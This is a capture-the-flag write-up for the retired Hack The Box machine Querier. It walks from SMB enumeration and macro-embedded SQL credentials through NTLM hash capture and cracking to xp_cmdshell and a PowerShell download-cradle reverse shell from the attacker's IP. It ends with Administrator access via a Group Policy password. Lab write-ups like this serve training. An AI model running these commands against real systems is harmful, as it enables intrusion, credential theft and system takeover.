# Querier

This is the write-up for the box Querier that got retired at the 22nd June 2019. 
My IP address was 10.10.14.13 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.125    querier.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/querier.nmap 10.10.10.125
```

```markdown
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2019-11-03T12:21:00
|_Not valid after:  2049-11-03T12:21:00
|_ssl-date: 2019-11-03T12:22:33+00:00; +3s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Scanning all ports:
```markdown
nmap -p- -o nmap/alports_querier.nmap 10.10.10.125
```

```markdown
PORT      STATE SERVICE
(...)
5985/tcp  open  wsman
47001/tcp open  winrm
(...)
```

## Checking SMB (Port 445)

Enumerating the SMB shares we get some interesting information:
```markdown
smbmap -H 10.10.10.125 -u anyone
```
```markdown
Disk                      Permissions
----                      -----------
ADMIN$                    NO ACCESS
C$                        NO ACCESS
IPC$                      READ ONLY
Reports                   READ ONLY
```

We have Read permissions on the _Reports_ folder. Connecting to it we can download the files:
```markdown
smbclient -N //10.10.10.125/Reports
```

There is one file called **Currency Volume Reports.xlsm** which is an Excel sheet.
We will analyze this file with **Oletools** that is build to analyze OLE and MS Office files and can be installed from the Kali repositories or from GitHub.
```markdown
olevba "Currency Volume Report.xlsm"
```

This finds a macro in this Excel sheet that opens automatically with this code:
```vba
Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
  
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
```

In this code we get the User ID **reporting** and a password **PcwTWTHRwryjc$c6** for a SQL Server.

## Checking SQL Server (Port 1433)

As we now have some credentials we try them on this SQL Server instance.
For the connection we will use the **mssqlclient.py** script from the **Impacket framework**.
```markdown
./mssqlclient.py reporting@10.10.10.125 -windows-auth
```

After putting in the password we get in and can execute commands that impacket provides us. The command `enable_xp_cmdshell` is to start a shell but it fails because the user has no permission to do this, that's why we are going to extract his NTLM hash with **Responder**:
```markdown
responder -I tun0
```

Now on the SQL Server we need to requests any authentication to our local machine:
```markdown
xp_dirtree "\\10.10.14.13\Test\"
```

And we got the hash of the user _mssql-svc_:
```markdown
[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:57cea40f4c2e712b:056A56D1BC6AB83312DCE4BD166EF4C6:0101000000000000C0653150DE09D2012F013EA964D29CC0000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000002608F4E9B17E1DDF96359899FC51C16D550D74F9089591EB6BC3D4758EB9C3140A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003300000000000000000000000000
```

We can try to crack this with **Hashcat**:
```markdown
hashcat -m 5600 querier.ntlm /opt/wordlist/rockyou.txt
```

After a while we get the password:
> corporate568

### Authenticating to the SQL Server 

With this credentials we can authenticate to the SQL Server again to see if we got more permissions:
```markdown
./mssqlclient.py mssql-svc@10.10.10.125 -windows-auth
```

When we execute the command `enable_xp_cmdshell` this time we get a shell and can verify this by running whoami:
```markdown
xp_cmdshell whoami
```

So as we can execute any command we want to start a reverse shell. We will execute the **Invoke-PowershellTcp.ps1** script from the **Nishang framework** that I will call _shell.ps1_ that listens on my IP and port 9001:
```markdown
xp_cmdshell powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/shell.ps1')"
```

Running this starts a reverse shell on the box as the user _mssql-svc_.

## Privilege Escalation

To get any attack surface we will run the enumarating script **PowerUp.ps1** from the **PowerSploit framework** to identify what we can exploit.
```powershell
IEX(New-Object Net.WebClient).downloadString("http://10.10.14.13/PowerUp.ps1")

Invoke-AllChecks
```

This part of the output gives us interesting information:
```markdown
[] Checking for cached Group Policy Preferences .xml files....

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
```

We get a password for the user _Administrator_ that is hidden in a Group Policy XML file.

Lets try these credentials with _psexec_:
```markdown
./psexec.py Administrator@10.10.10.125
```

Now we are _NT Authority\SYSTEM_ on the box!
